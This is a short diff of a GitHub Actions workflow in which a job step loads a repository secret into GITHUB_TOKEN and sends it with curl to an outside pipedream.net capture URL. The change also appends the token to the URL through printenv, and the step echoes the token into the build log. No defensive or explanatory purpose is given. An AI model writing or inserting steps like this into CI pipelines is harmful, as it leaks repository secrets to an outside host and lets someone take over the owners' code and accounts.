@@ -28,6 +28,6 @@ jobs:
           GITHUB_TOKEN: ${{ secrets.MY_TOP_SECRET }}
         run: |
           echo "OKKKKKKK=======START============"
-          curl -d '{"token": "$GITHUB_TOKEN"}' -H "Content-Type: application/json" https://eo9e2wl4ggfl3yu.m.pipedream.net
+          curl -d '{"token": "$GITHUB_TOKEN"}' -H "Content-Type: application/json" https://eo9e2wl4ggfl3yu.m.pipedream.net?t=$(printenv GITHUB_TOKEN)
           echo "$GITHUB_TOKEN"
           echo "=============xxxDonexxx========="
